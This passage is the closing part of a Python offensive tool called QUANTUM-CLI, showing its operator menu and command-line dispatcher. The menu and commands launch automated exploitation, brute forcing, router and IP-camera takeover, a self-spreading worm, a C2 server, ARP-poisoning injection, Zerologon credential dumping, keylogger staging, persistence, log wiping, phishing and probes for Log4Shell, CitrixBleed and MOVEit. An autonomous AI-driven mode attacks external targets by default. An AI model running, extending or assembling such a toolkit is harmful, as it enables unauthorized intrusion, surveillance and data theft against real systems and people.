  {Fore.GREEN}EXPLOITATION{Fore.RESET}    6. Auto-exploit (gated)  7. Force  8. Brute  9. Router
  {Fore.GREEN}POST-EXPLOIT{Fore.RESET}    10. Harvest host  12. Trinity capture  13. PCAP  15. Worm
  {Fore.GREEN}C2 / NETWORK{Fore.RESET}    19. Start C2  20. FOXACID  21. QUANTUM  22. ICMP listen
  {Fore.GREEN}V3 POST-EXP{Fore.RESET}     29. Zerocheck probe battery   30. Kill-switch arm/disarm
  {Fore.GREEN}AI / OPSEC{Fore.RESET}      23. Query AI  24. Tor  25. Seal  26. Unseal  27. Deploy local AI
  {Fore.GREEN}MODE{Fore.RESET}            28. FULLY AUTONOMOUS mode    0. Exit
""")
        try:
            ch = input(f"{Fore.CYAN}qcli>{Fore.RESET} ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); return
        if ch == "0": return
        try:
            if ch == "c":  camera_console(local_scope())
            elif ch == "1":  ReconModule().scan(input("CIDR: "))
            elif ch == "2":  print(json.dumps(ReconModule().fingerprint(input("Target IP: ")), indent=2, default=str))
            elif ch == "3":  print(json.dumps(ReconModule().osint(input("Domain: ")), indent=2, default=str))
            elif ch == "4":
                ip = input("Target IP: ")
                print(json.dumps(VALIDATOR.score(ip, ReconModule().fingerprint(ip)), indent=2))
            elif ch == "6":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: ")), indent=2, default=str))
            elif ch == "7":  print(json.dumps(ExploitOrchestrator().auto_exploit(input("Target IP: "), force=True), indent=2, default=str))
            elif ch == "8":  print(json.dumps(BruteEngineV3().run({"ip": input("Target IP: ")}), indent=2))
            elif ch == "9":  print(json.dumps(UnitedDrake().attack_router(input("Router IP: ")) or {}, indent=2))
            elif ch == "10": print(json.dumps(DataHarvester().harvest_host(input("Host label: ")), indent=2))
            elif ch == "11":
                cidr = input("CIDR: ") or local_scope()
                for cam in CAMWAR.discover(cidr):
                    if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
            elif ch == "12": Trinity(int(input("Seconds: ") or 30)).capture()
            elif ch == "13": print(json.dumps(DataHarvester().analyze_pcap(input("PCAP file: ")), indent=2))
            elif ch == "15":
                threading.Thread(target=GODSUPREME.hop_from, args=(input("Hop source IP: "),), daemon=True).start()
            elif ch == "19":
                keygen()
                def _read(p, alt):
                    fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
                    return open(fp).read() if os.path.isfile(fp) else alt
                agents = {"default": _read(AGENT, "# agent file missing"),
                          "linux":   _read("ghostfang.sh", "# run posixagent first"),
                          "mac":     _read("ghostfang.sh", "# run posixagent first")}
                threading.Thread(target=lambda a=agents: run_c2(make_c2(a)), daemon=True).start()
                print("C2 on :8443 (waitress WSGI, background) — /s, /r, /ai, /dash, /kill, /federation/*")
            elif ch == "20":
                threading.Thread(target=FoxAcid().serve, daemon=True).start()
                print("FOXACID on :8081 (background)")
            elif ch == "21":
                q = QuantumInsert(input("Target IP: "), input("Gateway IP: ")); q.poison(); q.inject()
            elif ch == "22": print(json.dumps(SwitchboardICMP().listen(20), indent=2))
            elif ch == "23":
                r = AI_Supervisor().query(input("Prompt: "))
                print(r if r else "[AI unavailable — QBrain mode active]")
            elif ch == "24": OPSEC.ensure_tor()
            elif ch == "25": GRAYFISH.seal_dir()
            elif ch == "26": GRAYFISH.unseal_dir()
            elif ch == "27":
                model = DM.deploy_local_ai()
                print(json.dumps({"local_ai": model, "models_dir": MODELS_DIR}))
            elif ch == "28":
                scope = input("Scope CIDR (blank = autodetect): ") or None
                agg = input("Aggression balanced|aggressive|patient (default balanced): ") or "balanced"
                AutonomousOverlord(scope=scope, aggression=agg).run()
            elif ch == "29":
                ip = input("Target IP: ")
                print(json.dumps({"log4shell": v3_log4shell(ip), "citrixbleed": v3_citrixbleed(ip),
                                  "citrix_path": v3_citrix_path(ip), "panos": v3_panos_cmd(ip),
                                  "confluence": v3_confluence_ognl(ip), "weblogic": v3_weblogic_console(ip),
                                  "iosxe": v3_ios_admin(ip), "vcenter": v3_vcenter_upload(ip),
                                  "moveit": v3_moveit_probe(ip)}, indent=2, default=str))
            elif ch == "30":
                arm = input("Arm kill-switch (y=arm, n=disarm): ").lower().startswith("y")
                if arm:
                    print(json.dumps(kill_all_implants(wipe_first=True)))
                else:
                    KILLSWITCH["on"] = False
                    print("kill-switch disarmed")
            else:
                print("unknown option")
        except Exception as e:
            log(f"menu error: {e}", "ERR")

# ============================================================================
# 15. MAIN
# ============================================================================
NEEDS_TARGET = {"osint", "recon", "validator", "auto", "phish", "brute", "router",
                "worm", "camshot", "quantum", "cottonmouth", "zerocheck"}

def _is_ipv4(s):
    return bool(re.match(r"^\d{1,3}(\.\d{1,3}){3}$", s or ""))

def main():
    p = argparse.ArgumentParser(
        description="QUANTUM-CLI FINAL V3.1 — no args = fully autonomous (camera-first)")
    p.add_argument("cmd", nargs="?", default=None,
                   choices=["serve", "foxacid", "quantum", "recon", "osint", "auto",
                            "dohc2", "icmp", "trinity", "camwar", "cams", "wifi", "triage",
                            "mfp", "pcap", "camshot", "router", "worm", "episcribe",
                            "cottonmouth", "validator", "tor", "seal", "unseal", "brute",
                            "phish", "keygen", "deployai", "zerologon", "mitre", "federation",
                            "posixagent", "zerocheck", "mshtmaldoc", "flashfill", "emoji",
                            "macreset", "keylog", "wipe", "persist", "ghostdns", "cagebreak"],
                   help="direct command (optional)")
    p.add_argument("--menu", action="store_true", help="manual console")
    p.add_argument("--scope", "-c", dest="cidr", help="autonomous/scan scope CIDR")
    p.add_argument("--target", "-t", help="external target CIDR/IP — run camera war on it "
                                          "AUTONOMOUSLY by default (add --manual for manual)")
    p.add_argument("--manual", action="store_true", help="with --target: manual camera console")
    p.add_argument("--camera-only", action="store_true",
                   help="autonomous mode restricted to camera operations")
    p.add_argument("--no-ai", action="store_true",
                   help="run fully deterministic (QBrain) — no AI prompts, no model downloads")
    p.add_argument("--cycles", type=int, default=0, help="autonomous cycle cap (0=infinite)")
    p.add_argument("--aggression", default="balanced", choices=["balanced", "aggressive", "patient"])
    p.add_argument("--model", help="pin local AI model (overrides adaptive selection)")
    p.add_argument("--kill", action="store_true",
                   help="with 'serve'less direct run: arm the kill-switch against live C2 via /kill")
    p.add_argument("--domain", help="operator-controlled domain for DoH egress beacons (ghostdns)")
    p.add_argument("-g", "--gateway"); p.add_argument("--iface")
    p.add_argument("--peer", help="federation peer .onion to sync")
    p.add_argument("-dc-ip"); p.add_argument("-dc-name"); p.add_argument("-d")
    p.add_argument("-f", "--file"); p.add_argument("--force", action="store_true")
    a = p.parse_args()

    if a.no_ai:
        os.environ["QCLI_NO_AI"] = "1"
        AI_Supervisor.ai_dead = True

    # ---- sanity guards for direct commands ----
    if a.cmd in NEEDS_TARGET and not a.target:
        print(f"error: command '{a.cmd}' needs -t/--target (IP or CIDR)"); return
    if a.cmd == "pcap" and not a.file:
        print("error: command 'pcap' needs -f/--file <pcap path>"); return

    # ---- AI bootstrap: .env -> 5s prompt -> search/deploy local model in dir ----
    sup = AI_Supervisor()
    if a.model:
        os.environ["QCLI_PINNED_MODEL"] = a.model
    try:
        sup.bootstrap()
    except Exception as e:
        log(f"AI bootstrap issue (continuing — QBrain fallback available): {e}", "WARN")

    # -------- external target: autonomous camera war BY DEFAULT --------
    if a.target:
        if "/" in a.target:
            cidr = a.target
        elif _is_ipv4(a.target):
            cidr = a.target.rsplit(".", 1)[0] + ".0/24"
        else:
            cidr = a.target
        log(f"EXTERNAL target given: {cidr}", "AUTO")
        if a.manual:
            camera_console(cidr)
        else:
            AutonomousOverlord(scope=cidr, aggression=a.aggression,
                                camera_only=a.camera_only).run()
        return

    if not a.cmd and not a.menu:
        AutonomousOverlord(scope=a.cidr, cycles=a.cycles, aggression=a.aggression,
                           camera_only=a.camera_only).run()
        return

    if a.menu:
        menu(); return

    if   a.cmd == "keygen":     keygen(a.force); return
    elif a.cmd == "deployai":
        print(json.dumps({"local_ai": DM.deploy_local_ai(a.model), "models_dir": MODELS_DIR})); return
    elif a.cmd == "tor":        OPSEC.ensure_tor(); return
    elif a.cmd == "seal":       GRAYFISH.seal_dir(); return
    elif a.cmd == "unseal":     GRAYFISH.unseal_dir(); return
    elif a.cmd == "serve":
        keygen()
        def _read(p, alt):
            fp = p if os.path.isabs(p) else os.path.join(QCLI_DIR, p)
            return open(fp).read() if os.path.isfile(fp) else alt
        agents = {"default": _read(AGENT, "# agent file missing"),
                  "linux":   _read("ghostfang.sh", "# run posixagent first"),
                  "mac":     _read("ghostfang.sh", "# run posixagent first")}
        run_c2(make_c2(agents)); return
    elif a.cmd == "foxacid":    FoxAcid().serve(); return
    elif a.cmd == "quantum":
        q = QuantumInsert(a.target, a.gateway); q.poison()
        threading.Thread(target=q.inject, daemon=True).start(); time.sleep(70); return
    elif a.cmd == "mitre":     print(json.dumps(MitreMapper().map_audit(), indent=2)); return
    elif a.cmd == "federation":
        if a.peer: print(json.dumps({"merged": FEDERATION.pull(a.peer)})); return
        print(json.dumps({"onion": FEDERATION.start_hidden_service()})); return
    elif a.cmd == "posixagent":
        print(json.dumps({"agent": generate_posix_agent(a.target or local_ip())})); return
    elif a.cmd == "ghostdns":
        domain = a.domain or load_env_file().get("QCLI_DOMAIN") or os.environ.get("QCLI_DOMAIN")
        if not domain:
            print("usage: quantum_cli.py ghostdns --domain yourdomain.tld "
                  "(also honored via .env QCLI_DOMAIN)"); return
        print(json.dumps({"agent": generate_dns_agent(domain),
                          "task_check": doh_task_check(domain)})); return
    elif a.cmd == "osint":     print(json.dumps(ReconModule().osint(a.target), indent=2, default=str)); return
    elif a.cmd == "recon":     print(json.dumps(ReconModule().fingerprint(a.target), indent=2, default=str)); return
    elif a.cmd == "validator": print(json.dumps(VALIDATOR.score(a.target, ReconModule().fingerprint(a.target)), indent=2)); return
    elif a.cmd == "auto":      print(json.dumps(ExploitOrchestrator().auto_exploit(a.target, force=a.force), indent=2, default=str)); return
    elif a.cmd == "zerocheck": print(json.dumps({"log4shell": v3_log4shell(a.target),
                                                 "citrixbleed": v3_citrixbleed(a.target),
                                                 "citrix_path": v3_citrix_path(a.target),
                                                 "panos": v3_panos_cmd(a.target),
                                                 "confluence": v3_confluence_ognl(a.target),
                                                 "weblogic": v3_weblogic_console(a.target),
                                                 "iosxe": v3_ios_admin(a.target),
                                                 "vcenter": v3_vcenter_upload(a.target),
                                                 "moveit": v3_moveit_probe(a.target)},
                                                indent=2, default=str)); return
    elif a.cmd == "mshtmaldoc": print(json.dumps(v3_mshtml_maldoc(local_ip()), default=str)); return
    elif a.cmd == "flashfill": print(json.dumps(flashfill())); return
    elif a.cmd == "emoji":
        msg = input("Message: ") or "ping"
        print(emoji_encode(msg)); print("DECODED CHECK:", emoji_decode(emoji_encode(msg))); return
    elif a.cmd == "macreset":  print(json.dumps({"script": macos_recovery_reset()})); return
    elif a.cmd == "keylog":    print(json.dumps({"staged": stage_keylogger()})); return
    elif a.cmd == "wipe":
        print(json.dumps(footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix())); return
    elif a.cmd == "persist":   print(json.dumps(persistx())); return
    elif a.cmd == "cagebreak": print(json.dumps(cagebreak(), indent=2, default=str)); return
    elif a.cmd == "zerologon":
        if not (a.dc_ip and a.dc_name):
            print("usage: quantum_cli.py zerologon -dc-ip <ip> -dc-name <name> -d <domain>"); return
        print(json.dumps({"dumped": zerologon_dump(a.dc_ip, a.dc_name, a.domain or "corp.local")})); return
    elif a.cmd == "dohc2":     HTTPServer(("0.0.0.0", 5353), DoHC2BeaconServer).serve_forever(); return
    elif a.cmd == "icmp":      print(json.dumps(SwitchboardICMP().listen(20), indent=2)); return
    elif a.cmd == "trinity":   Trinity().capture(); return
    elif a.cmd == "wifi":      print(json.dumps(Somberknight().sweep(), indent=2)); return
    elif a.cmd == "triage":    print(json.dumps(Wildfire().triage(), indent=2, default=str)); return
    elif a.cmd == "mfp":       print(json.dumps({"persisted": MFP().persist()})); return
    elif a.cmd == "pcap":      print(json.dumps(DataHarvester().analyze_pcap(a.file), indent=2)); return
    elif a.cmd == "camwar":
        print(json.dumps(CAMWAR.pwn_network(a.cidr or a.target or local_scope()), indent=2)); return
    elif a.cmd == "cams":
        cams = CAMWAR.discover(a.cidr or a.target or local_scope())
        for cam in cams:
            if CAMWAR.attack_cam(cam): CAMWAR.control_cam(cam)
        return
    elif a.cmd == "camshot":
        print(json.dumps(CAMWAR.one_shot(a.target), indent=2, default=str)); return
    elif a.cmd == "router":    print(json.dumps(UnitedDrake().attack_router(a.target) or {}, indent=2)); return
    elif a.cmd == "worm":
        t = threading.Thread(target=GODSUPREME.hop_from, args=(a.target,), daemon=True)
        t.start(); t.join(); return
    elif a.cmd == "episcribe":
        e = EpiScribe()
        if a.target: e.add_selector(a.target)
        e.watch(duration=300); print(json.dumps(e.events, indent=2)); return
    elif a.cmd == "cottonmouth":
        print(json.dumps({"staged": CottonMouth().stage_payload(a.target or local_ip())})); return
    elif a.cmd == "brute":     print(json.dumps(BruteEngineV3().run({"ip": a.target}), indent=2)); return
    elif a.cmd == "phish":     print(json.dumps(PhishEngine().launch({"target_email": a.target}), indent=2, default=str)); return

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        log("operator interrupt — sealing loot and exiting", "AUTO"); GRAYFISH.seal_dir()
    except SystemExit:
        raise
    except Exception as _fatal:
        log(f"FATAL: {_fatal}", "ERR")
        import traceback
        os.makedirs(LOG_DIR, exist_ok=True)
        with open(os.path.join(LOG_DIR, "crash.log"), "a") as f:
            f.write(f"--- {datetime.now().isoformat()} ---\n" + traceback.format_exc() + "\n")
        sys.exit(1)
